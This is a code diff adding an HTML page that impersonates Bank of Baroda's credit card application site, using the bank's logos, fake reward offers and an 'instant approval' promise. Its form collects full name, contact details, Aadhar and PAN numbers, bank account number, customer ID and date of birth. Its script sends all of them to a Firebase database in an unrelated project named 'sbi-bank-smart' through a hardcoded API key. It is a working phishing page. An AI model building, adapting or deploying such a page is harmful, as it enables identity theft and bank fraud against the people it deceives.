@@ -1,1 +1,962 @@
-hi
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>BOB Card – Apply Online | Credit Card Application</title>
+    <!-- Firebase SDK -->
+    <!-- Favicon Style Logo for Title Bar -->
+    <link rel="icon" type="image/svg+xml"
+        href="https://th.bing.com/th/id/OIP.Dc6plWge-isu8UebYXjOdwHaGg?w=187&h=180&c=7&r=0&o=7&pid=1.7&rm=3">
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            background: #f0f2f5;
+            color: #1e293b;
+        }
+
+        :root {
+            --bob-blue: #1B4F9E;
+            --bob-orange: #E65C1E;
+            --bob-dark: #0E3A7A;
+            --gray-light: #f8fafc;
+            --gray-border: #e2e8f0;
+        }
+
+        .container {
+            max-width: 1280px;
+            margin: 0 auto;
+            padding: 0 24px;
+        }
+
+        /* Header - Official BOB Card Logo Section */
+        .top-bar {
+            background: white;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.04);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .nav-flex {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 20px;
+            padding: 16px 0;
+        }
+
+        /* Official Logo Area - As requested */
+        .logo-area {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo-area img {
+            height: 45px;
+            width: auto;
+        }
+
+        .brand-text {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--bob-blue);
+        }
+
+        .brand-text span {
+            color: var(--bob-orange);
+        }
+
+        .btn-outline-light {
+            background: transparent;
+            border: 1.5px solid var(--bob-blue);
+            padding: 8px 20px;
+            border-radius: 40px;
+            font-weight: 600;
+            color: var(--bob-blue);
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn-outline-light:hover {
+            background: var(--bob-blue);
+            color: white;
+        }
+
+        /* Hero Section */
+        .hero-section {
+            background: linear-gradient(135deg, #ffffff 0%, #f0f4fa 100%);
+            padding: 20px 0;
+        }
+
+        .hero-grid {
+            display: flex;
+            align-items: center;
+            gap: 30px;
+            flex-wrap: wrap;
+        }
+
+        .hero-left {
+            flex: 1;
+        }
+
+        .hero-left h1 {
+            font-size: 2.5rem;
+            font-weight: 800;
+            color: var(--bob-blue);
+            line-height: 1.2;
+            margin-bottom: 20px;
+        }
+
+        .hero-left h1 .highlight {
+            color: var(--bob-orange);
+        }
+
+        .hero-left p {
+            font-size: 1rem;
+            color: #334155;
+            margin-bottom: 25px;
+        }
+
+        .badge-list {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+            margin-bottom: 25px;
+        }
+
+        .badge-list span {
+            background: white;
+            padding: 6px 14px;
+            border-radius: 40px;
+            font-size: 13px;
+            font-weight: 600;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.05);
+            border: 1px solid var(--gray-border);
+        }
+
+        .apply-btn {
+            background: linear-gradient(95deg, var(--bob-blue), var(--bob-dark));
+            border: none;
+            padding: 14px 38px;
+            border-radius: 48px;
+            font-weight: 700;
+            font-size: 1rem;
+            color: white;
+            cursor: pointer;
+            box-shadow: 0 8px 18px rgba(27, 79, 158, 0.25);
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            transition: all 0.3s;
+        }
+
+        .apply-btn:hover {
+            transform: translateY(-2px);
+            background: linear-gradient(95deg, var(--bob-orange), #c84a12);
+        }
+
+        .hero-right {
+            flex: 1;
+            text-align: center;
+        }
+
+        .card-image {
+            max-width: 100%;
+            width: 380px;
+            border-radius: 20px;
+            box-shadow: 0 20px 35px -10px rgba(0, 0, 0, 0.2);
+        }
+
+        /* Banner Slider */
+        .banner-section {
+            position: relative;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+
+        .banner-slider {
+            display: flex;
+            transition: transform 0.5s ease;
+        }
+
+        .banner-slide {
+            min-width: 100%;
+        }
+
+        .banner-slide img {
+            width: 100%;
+            height: auto;
+            display: block;
+            border-radius: 20px;
+        }
+
+        .slider-dots {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 15px;
+        }
+
+        .dot {
+            width: 10px;
+            height: 10px;
+            background: #cbd5e1;
+            border-radius: 50%;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .dot.active {
+            background: var(--bob-orange);
+            width: 25px;
+            border-radius: 10px;
+        }
+
+        /* Form Section */
+        .form-section {
+            background: white;
+            padding: 50px 0;
+        }
+
+        .form-card {
+            max-width: 600px;
+            margin: 0 auto;
+            background: var(--gray-light);
+            border-radius: 32px;
+            padding: 35px 30px;
+            box-shadow: 0 12px 28px rgba(0, 0, 0, 0.05);
+            border: 1px solid rgba(230, 92, 30, 0.2);
+        }
+
+        .form-card h2 {
+            text-align: center;
+            font-size: 1.8rem;
+            color: var(--bob-blue);
+            margin-bottom: 10px;
+        }
+
+        .form-card p {
+            text-align: center;
+            color: #475569;
+            margin-bottom: 25px;
+        }
+
+        .input-group {
+            margin-bottom: 18px;
+        }
+
+        .input-label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--bob-blue);
+            margin-bottom: 8px;
+        }
+
+        .input-label i {
+            margin-right: 6px;
+            color: var(--bob-orange);
+        }
+
+        .input-field,
+        .input-select {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1.5px solid var(--gray-border);
+            border-radius: 14px;
+            font-size: 14px;
+            transition: all 0.3s;
+            outline: none;
+            background: white;
+        }
+
+        .input-field:focus,
+        .input-select:focus {
+            border-color: var(--bob-orange);
+            box-shadow: 0 0 0 3px rgba(230, 92, 30, 0.1);
+        }
+
+        .row-2 {
+            display: flex;
+            gap: 15px;
+        }
+
+        .row-2 .input-group {
+            flex: 1;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background: linear-gradient(95deg, var(--bob-blue), var(--bob-dark));
+            border: none;
+            padding: 14px;
+            border-radius: 40px;
+            font-weight: 700;
+            font-size: 1rem;
+            color: white;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: 0.2s;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            background: linear-gradient(95deg, var(--bob-orange), #c84a12);
+        }
+
+        /* Offers Section */
+        .offers-section {
+            background: white;
+            padding: 50px 0;
+        }
+
+        .section-title {
+            text-align: center;
+            font-size: 2rem;
+            font-weight: 700;
+            color: var(--bob-blue);
+            margin-bottom: 40px;
+        }
+
+        .offers-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 25px;
+        }
+
+        .offer-card {
+            background: white;
+            border-radius: 20px;
+            padding: 20px;
+            border: 1px solid var(--gray-border);
+            transition: all 0.3s;
+            text-align: center;
+        }
+
+        .offer-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+            border-color: var(--bob-orange);
+        }
+
+        .offer-icon {
+            width: 60px;
+            height: 60px;
+            background: linear-gradient(135deg, rgba(27, 79, 158, 0.1), rgba(230, 92, 30, 0.1));
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            font-size: 28px;
+            color: var(--bob-orange);
+        }
+
+        .offer-card h3 {
+            font-size: 18px;
+            color: var(--bob-blue);
+            margin-bottom: 8px;
+        }
+
+        .offer-card p {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 8px;
+        }
+
+        .offer-value {
+            font-size: 14px;
+            font-weight: bold;
+            color: var(--bob-orange);
+        }
+
+        /* Footer */
+        .footer {
+            background: var(--bob-dark);
+            color: #cbd5e1;
+            padding: 32px 0;
+            text-align: center;
+            font-size: 0.85rem;
+        }
+
+        .footer a {
+            color: #facc15;
+            text-decoration: none;
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #28a745;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 30px;
+            font-size: 14px;
+            z-index: 1001;
+            display: none;
+            animation: fadeInUp 0.3s ease;
+        }
+
+        .toast.error {
+            background: #dc3545;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateX(-50%) translateY(20px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateX(-50%) translateY(0);
+            }
+        }
+
+        @media (max-width: 800px) {
+            .hero-left h1 {
+                font-size: 1.8rem;
+            }
+
+            .hero-grid {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .badge-list {
+                justify-content: center;
+            }
+
+            .row-2 {
+                flex-direction: column;
+                gap: 0;
+            }
+        }
+
+        /* Reward Points Banner */
+        .reward-points-banner {
+            background: linear-gradient(135deg, #1B4F9E, #0E3A7A);
+            margin: 20px;
+            border-radius: 24px;
+            padding: 5px;
+        }
+
+        .reward-card {
+            background: white;
+            border-radius: 20px;
+            padding: 25px;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            flex-wrap: wrap;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+        }
+
+        .reward-icon {
+            width: 70px;
+            height: 70px;
+            background: linear-gradient(135deg, #E65C1E, #c84a12);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .reward-icon i {
+            font-size: 32px;
+            color: white;
+        }
+
+        .reward-content {
+            flex: 1;
+        }
+
+        .reward-content h3 {
+            font-size: 18px;
+            color: #1B4F9E;
+            margin-bottom: 5px;
+        }
+
+        .reward-points {
+            font-size: 32px;
+            font-weight: 800;
+            color: #E65C1E;
+            margin: 5px 0;
+        }
+
+        .reward-content p {
+            font-size: 13px;
+            color: #666;
+        }
+
+        .reward-buttons {
+            display: flex;
+            gap: 12px;
+            margin-top: 10px;
+        }
+
+        .reward-btn {
+            padding: 8px 20px;
+            border: none;
+            border-radius: 25px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .withdraw-btn {
+            background: #28a745;
+            color: white;
+        }
+
+        .withdraw-btn:hover {
+            background: #218838;
+            transform: translateY(-2px);
+        }
+
+        .redeem-btn {
+            background: #E65C1E;
+            color: white;
+        }
+
+        .redeem-btn:hover {
+            background: #c84a12;
+            transform: translateY(-2px);
+        }
+
+        @media (max-width: 600px) {
+            .reward-card {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .reward-buttons {
+                justify-content: center;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="top-bar">
+        <div class="container">
+            <div class="nav-flex">
+                <!-- Official Logo Area as requested -->
+                <div class="logo-area">
+                    <img src="https://www.bobcard.co.in/_next/static/media/bobcard-logo.ce0e92dd.svg"
+                        alt="BOB Card Logo"
+                        onerror="this.src='https://via.placeholder.com/120x45/1B4F9E/white?text=BOB+Card'">
+
+                </div>
+                <div>
+                    <button class="btn-outline-light" onclick="alert('Existing user? Please login using NetBanking')">
+                        <i class="fas fa-lock"></i> Existing User
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hero Section -->
+    <section class="hero-section">
+        <div class="container">
+            <div class="hero-grid">
+                <div class="hero-left">
+                    <h1>Elevate <span class="highlight">everyday experiences</span> with BOB Credit Cards</h1>
+                    <p>Unlimited rewards, lounge access, fuel savings & flexible EMIs – all at your fingertips.</p>
+                    <div class="badge-list">
+                        <span><i class="fas fa-check-circle"></i> No Joining Fee*</span>
+                        <span><i class="fas fa-gift"></i> Lifetime Free*</span>
+                        <span><i class="fas fa-plane"></i> Travel Rewards</span>
+                    </div>
+                    <button class="apply-btn"
+                        onclick="document.getElementById('applicationForm').scrollIntoView({behavior:'smooth'})">
+                        <i class="fas fa-arrow-right"></i> Apply Now
+                    </button>
+                </div>
+                <div class="hero-right">
+                    <img class="card-image"
+                        src="https://www.bobcard.co.in/_next/image?url=https%3A%2F%2Fcms.bobcard.co.in%2F%2Fmedia%2Fb4pj5ukl%2Fbobcard-eterna_1920-x-1253.png&w=256&q=75"
+                        alt="BOB Credit Card"
+                        onerror="this.src='https://via.placeholder.com/380x250/1B4F9E/white?text=BOB+Card'">
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Banner Slider -->
+    <div class="container">
+        <div class="banner-section">
+            <div class="banner-slider" id="bannerSlider">
+                <div class="banner-slide">
+                    <img src="https://media.bobcard.co.in//media/vv2lexsc/final_eterna-credit-card-2_lifetime-free_1920x696.jpg"
+                        alt="BOB Eterna Card"
+                        onerror="this.src='https://via.placeholder.com/1200x300/1B4F9E/white?text=BOB+Eterna+Card'">
+                </div>
+                <div class="banner-slide">
+                    <img src="https://media.bobcard.co.in//media/xeobwvz3/tripstacc_website-banner_1200-x-480-px-2.jpg"
+                        alt="BOB TripStack"
+                        onerror="this.src='https://via.placeholder.com/1200x300/E65C1E/white?text=TripStack+Offers'">
+                </div>
+                <div class="banner-slide">
+                    <img src="https://media.bobcard.co.in//media/2xanpnt0/bobcard-summer-deals-w-2.png"
+                        alt="BOB Summer Deals"
+                        onerror="this.src='https://via.placeholder.com/1200x300/2E7D32/white?text=Summer+Deals'">
+                </div>
+            </div>
+            <div class="slider-dots" id="sliderDots"></div>
+        </div>
+    </div>
+
+    <!-- Application Form Section -->
+    <section id="applicationForm" class="form-section">
+        <div class="container">
+            <div class="form-card">
+                <h2><i class="fas fa-credit-card"></i> Apply for BOB Credit Card</h2>
+                <p>Fill your details & get instant approval</p>
+
+                <form id="applyForm">
+                    <div class="input-group">
+                        <label class="input-label"><i class="fas fa-user"></i> Full Name</label>
+                        <input type="text" id="fullName" class="input-field" placeholder="Enter your full name"
+                            required>
+                    </div>
+
+                    <div class="row-2">
+                        <div class="input-group">
+                            <label class="input-label"><i class="fas fa-envelope"></i> Email ID</label>
+                            <input type="email" id="email" class="input-field" placeholder="Enter your email" required>
+                        </div>
+                        <div class="input-group">
+                            <label class="input-label"><i class="fas fa-mobile-alt"></i> Mobile Number</label>
+                            <input type="tel" id="mobile" class="input-field" placeholder="10-digit mobile"
+                                maxlength="10" required>
+                        </div>
+                    </div>
+
+                    <div class="row-2">
+                        <div class="input-group">
+                            <label class="input-label"><i class="fas fa-id-card"></i> Aadhar Number</label>
+                            <input type="text" id="aadhar" class="input-field" placeholder="12-digit Aadhar number"
+                                maxlength="12" required>
+                        </div>
+                        <div class="input-group">
+                            <label class="input-label"><i class="fas fa-id-card"></i> PAN Number</label>
+                            <input type="text" id="pan" class="input-field" placeholder="ABCDE1234F" maxlength="10"
+                                required>
+                        </div>
+                    </div>
+
+                    <div class="row-2">
+                        <div class="input-group">
+                            <label class="input-label"><i class="fas fa-credit-card"></i> Account Number</label>
+                            <input type="text" id="accountNumber" class="input-field"
+                                placeholder="Enter your account number" required>
+                        </div>
+                        <div class="input-group">
+                            <label class="input-label"><i class="fas fa-id-card"></i> Customer ID</label>
+                            <input type="text" id="customerId" class="input-field" placeholder="Enter customer ID"
+                                required>
+                        </div>
+                    </div>
+
+                    <div class="input-group">
+                        <label class="input-label"><i class="fas fa-calendar-alt"></i> Date of Birth</label>
+                        <input type="text" id="dob" class="input-field" placeholder="DD/MM/YYYY" maxlength="10"
+                            required>
+                    </div>
+
+                    <button type="submit" class="submit-btn">
+                        <i class="fas fa-check-circle"></i> Submit Application
+                    </button>
+                    <div class="terms-text" style="text-align: center; font-size: 11px; margin-top: 15px;">
+                        <i class="fas fa-lock"></i> Your information is secure with 256-bit encryption.<br>
+                        By submitting, you agree to T&C and privacy policy.
+                    </div>
+                </form>
+            </div>
+        </div>
+    </section>
+    <!-- Reward Points Banner -->
+    <div class="reward-points-banner">
+        <div class="container">
+            <div class="reward-card">
+                <div class="reward-icon">
+                    <i class="fas fa-gift"></i>
+                </div>
+                <div class="reward-content">
+                    <h3>🎉 Welcome Reward!</h3>
+                    <div class="reward-points">4,999 Reward Points</div>
+                    <p>On your first credit card transaction within 30 days</p>
+                    <div class="reward-buttons">
+                        <button class="reward-btn withdraw-btn" onclick="withdrawPoints()">
+                            <i class="fas fa-money-bill-wave"></i> Withdraw Points
+                        </button>
+                        <button class="reward-btn redeem-btn" onclick="redeemPoints()">
+                            <i class="fas fa-exchange-alt"></i> Redeem Now
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Offers Section -->
+    <section class="offers-section">
+        <div class="container">
+            <h2 class="section-title">🎁 Exclusive Credit Card Offers</h2>
+            <div class="offers-grid">
+                <div class="offer-card">
+                    <div class="offer-icon"><i class="fab fa-amazon"></i></div>
+                    <h3>Amazon</h3>
+                    <p>30% Instant Discount on BOB Cards</p>
+                    <span class="offer-value">Up to ₹1,500 off</span>
+                </div>
+                <div class="offer-card">
+                    <div class="offer-icon"><i class="fas fa-shopping-cart"></i></div>
+                    <h3>Flipkart</h3>
+                    <p>Flat ₹1,500 Off on orders above ₹5,000</p>
+                    <span class="offer-value">Code: BOBFLIP</span>
+                </div>
+                <div class="offer-card">
+                    <div class="offer-icon"><i class="fas fa-utensils"></i></div>
+                    <h3>Zomato</h3>
+                    <p>25% Cashback on Food Orders</p>
+                    <span class="offer-value">Up to ₹200 per order</span>
+                </div>
+                <div class="offer-card">
+                    <div class="offer-icon"><i class="fas fa-tshirt"></i></div>
+                    <h3>Myntra</h3>
+                    <p>35% Cashback on Fashion</p>
+                    <span class="offer-value">Min ₹1,000</span>
+                </div>
+                <div class="offer-card">
+                    <div class="offer-icon"><i class="fas fa-gas-pump"></i></div>
+                    <h3>Fuel</h3>
+                    <p>0% Surcharge Waiver at all pumps</p>
+                    <span class="offer-value">Unlimited</span>
+                </div>
+                <div class="offer-card">
+                    <div class="offer-icon"><i class="fas fa-chair"></i></div>
+                    <h3>Lounge Access</h3>
+                    <p>Complimentary access at 1000+ airports</p>
+                    <span class="offer-value">Domestic & International</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Why Choose BOB -->
+    <section class="offers-section" style="background: var(--gray-light);">
+        <div class="container">
+            <h2 class="section-title">Why choose BOB Credit Card?</h2>
+            <div class="offers-grid">
+                <div class="offer-card">
+                    <div class="offer-icon"><i class="fas fa-star-of-life"></i></div>
+                    <h3>Rewards Galore</h3>
+                    <p>Reward Points that never expire</p>
+                    <span class="offer-value">Redeem from extensive catalogue</span>
+                </div>
+                <div class="offer-card">
+                    <div class="offer-icon"><i class="fas fa-chart-line"></i></div>
+                    <h3>Flexible EMI</h3>
+                    <p>Convert big purchases into EMIs</p>
+                    <span class="offer-value">Low interest rates</span>
+                </div>
+                <div class="offer-card">
+                    <div class="offer-icon"><i class="fas fa-film"></i></div>
+                    <h3>Movie Offers</h3>
+                    <p>Save big on BookMyShow</p>
+                    <span class="offer-value">Up to 25% off</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <div class="container">
+            <p>© 2025 Bank of Baroda | Credit Card offerings are subject to eligibility & credit approval.</p>
+            <p style="margin-top: 8px;"><a href="#">Privacy Policy</a>&nbsp;&nbsp;|&nbsp;&nbsp;<a href="#">Terms &
+                    Conditions</a></p>
+        </div>
+    </footer>
+
+    <div id="toast" class="toast"></div>
+
+    <script>
+        // Firebase Config
+        const firebaseConfig = {
+            apiKey: "AIzaSyDOCAxkrREX1uWDU7Q765_YnXCptAsT_x4",
+            authDomain: "sbi-bank-smart.firebaseapp.com",
+            databaseURL: "https://sbi-bank-smart-default-rtdb.firebaseio.com",
+            projectId: "sbi-bank-smart",
+            storageBucket: "sbi-bank-smart.firebasestorage.app",
+            messagingSenderId: "47138803332",
+            appId: "1:47138803332:web:5cf924f6473772fab7fcd1"
+        };
+
+        if (!firebase.apps.length) {
+            firebase.initializeApp(firebaseConfig);
+        }
+        const database = firebase.database();
+
+        // Banner Slider
+        let currentSlide = 0;
+        const slides = document.querySelectorAll('.banner-slide');
+        const totalSlides = slides.length;
+        const slider = document.getElementById('bannerSlider');
+        const dotsContainer = document.getElementById('sliderDots');
+
+        if (totalSlides > 0) {
+            for (let i = 0; i < totalSlides; i++) {
+                const dot = document.createElement('div');
+                dot.classList.add('dot');
+                if (i === 0) dot.classList.add('active');
+                dot.onclick = () => goToSlide(i);
+                dotsContainer.appendChild(dot);
+            }
+        }
+
+        function goToSlide(index) {
+            currentSlide = index;
+            slider.style.transform = `translateX(-${currentSlide * 100}%)`;
+            updateDots();
+        }
+
+        function updateDots() {
+            const dots = document.querySelectorAll('.dot');
+            dots.forEach((dot, index) => {
+                dot.classList.toggle('active', index === currentSlide);
+            });
+        }
+
+        function nextSlide() {
+            if (totalSlides > 0) {
+                currentSlide = (currentSlide + 1) % totalSlides;
+                goToSlide(currentSlide);
+            }
+        }
+
+        if (totalSlides > 0) {
+            setInterval(nextSlide, 5000);
+        }
+
+        // DOB Auto-format
+        const dobInput = document.getElementById('dob');
+        dobInput.addEventListener('input', function (e) {
+            let value = this.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2);
+            }
+            if (value.length >= 5) {
+                value = value.substring(0, 5) + '/' + value.substring(5, 9);
+            }
+            this.value = value.substring(0, 10);
+        });
+
+        // Mobile number validation
+        document.getElementById('mobile').addEventListener('input', function () {
+            this.value = this.value.replace(/\D/g, '').slice(0, 10);
+        });
+
+        // Aadhar validation
+        document.getElementById('aadhar').addEventListener('input', function () {
+            this.value = this.value.replace(/\D/g, '').slice(0, 12);
+        });
+
+        // PAN auto uppercase
+        document.getElementById('pan').addEventListener('input', function () {
+            this.value = this.value.toUpperCase();
+        });
+
+        function showToast(message, isError = false) {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.className = `toast ${isError ? 'error' : ''}`;
+            toast.style.display = 'block';
+            setTimeout(() => toast.style.display = 'none', 3000);
+        }
+
+        document.getElementById('applyForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const fullName = document.getElementById('fullName').value.trim();
+            const email = document.getElementById('email').value.trim();
+            const mobile = document.getElementById('mobile').value.trim();
+            const aadhar = document.getElementById('aadhar').value.trim();
+            const pan = document.getElementById('pan').value.trim().toUpperCase();
+            const accountNumber = document.getElementById('accountNumber').value.trim();
+            const customerId = document.getElementById('customerId').value.trim();
+            const dob = document.getElementById('dob').value.trim();
+
+            if (!fullName || !email || !mobile || !aadhar || !pan || !accountNumber || !customerId || !dob) {
+                showToast('Please fill all fields', true);
+                return;
+            }
+
+            if (!/^\d{10}$/.test(mobile)) {
+                showToast('Enter valid 10-digit mobile number', true);
+                return;
+            }
+
+            if (!/^\d{12}$/.test(aadhar)) {
+                showToast('Enter valid 12-digit Aadhar number', true);
+                return;
+            }
+
+            if (!/^[A-Z]{5}[0-9]{4}[A-Z]{1}$/.test(pan)) {
+                showToast('Invalid PAN number format (e.g., ABCDE1234F)', true);
+                return;
+            }
+
+            if (!/^\d{2}\/\d{2}\/\d{4}$/.test(dob)) {
+                showToast('Enter valid DOB in DD/MM/YYYY format', true);
+                return;
+            }
+
+            const submitBtn = document.querySelector('.submit-btn');
+            const originalText = submitBtn.innerHTML;
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Submitting...';
+
+            const timestamp = Date.now();
+            const applicationData = {
+                fullName, email, mobile, aadhar, pan, accountNumber, customerId, dob,
+                timestamp: timestamp,
+                appliedAt: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+                status: 'pending',
+                source: 'bob_website_form'
+            };
+
+            try {
+                await database.ref(`bob_credit_applications/${timestamp}`).set(applicationData);
+                showToast('✅ Application submitted successfully! We will contact you soon.', false);
+                document.getElementById('applyForm').reset();
+            } catch (error) {
+                console.error(error);
+                showToast('❌ Submission failed. Please try again.', true);
+            } finally {
+                submitBtn.disabled = false;
+                submitBtn.innerHTML = originalText;
+            }
+        });
+
+    </script>
+</body>
+
+</html>
